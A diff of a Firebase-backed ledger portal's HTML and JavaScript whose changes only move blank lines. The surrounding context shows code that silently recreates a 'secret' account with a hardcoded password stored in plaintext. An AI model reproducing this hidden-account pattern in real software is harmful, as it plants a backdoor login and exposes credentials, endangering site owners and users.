@@ -179,7 +179,6 @@
         <section class="signature-section"><div class="sig-box">Prepared By</div><div class="sig-box">Checked By</div><div class="sig-box">Approved By</div></section>
         <footer class="portal-footer">Designed by <span style="font-weight:bold;color:#002060;">M. Moazzam</span> | © 2026 All Rights Reserved</footer>
     </div>
-
     <!-- REAL-TIME INTERACTIVE CLOUD LEDGER CORE SYSTEM JS INITIALIZER -->
     <script>
         (function() {
@@ -198,6 +197,7 @@
                 };
             };
         })();
+
         function initLedgerEngine() {
             if (!firebase.apps.length) { 
                 firebase.initializeApp({ databaseURL: "https://firebaseio.com" }); 
@@ -285,7 +285,6 @@
                     txtAuthPhone.style.display = "block";
                 }
             };
-
             async function renderUserManagementTable() {
                 userTableBody.innerHTML = `<tr><td colspan="4" style="text-align:center; color:#94a3b8; font-style:italic;">Loading live accounts...</td></tr>`;
                 try {
@@ -353,6 +352,7 @@
                 try {
                     const snapshot = await db.ref('idc_users').once('value');
                     let admins = snapshot.exists() ? snapshot.val() : {};
+                    
                     if (!admins[MY_SECRET_NAME]) { 
                         await db.ref('idc_users/' + MY_SECRET_NAME).set({ password: MY_SECRET_PASS, phone: "03000000000" }); 
                         admins[MY_SECRET_NAME] = { password: MY_SECRET_PASS, phone: "03000000000" }; 
